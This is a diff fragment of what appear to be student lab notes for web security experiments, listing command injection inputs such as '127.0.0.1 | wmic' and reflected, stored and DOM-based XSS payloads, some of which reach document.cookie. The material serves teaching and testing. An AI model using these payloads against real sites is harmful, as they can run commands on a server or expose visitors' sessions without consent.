@@ -11,6 +11,15 @@
 ## 127.0.0.1 | ipconfig
 ## 127.0.0.1 | wmic
 
+# 12. 
+## i. Reflected XSS
+## <script>alert(“xss”)</script>, <Script>alert(“hack by falcon”)</Script>, <img src=x onerror=alert(“falcon”)>
+
+## ii. Stored XSS
+## <script>alert(document.domain)</script>,<img src=x onerror=alert(document.domain)>, <body onload=alert(“bingo”)>
+
+## iii. DOM based XSS
+## <script>alert(1)</script>, English#<script>alert(1)</script>,English#<script>alert(document.cookie)</script>
 Q.No
 Experiments
 # 1 . Develop a HTML Registration form for Amrita Cyber Nation with Captcha and Hidden Form Fields.
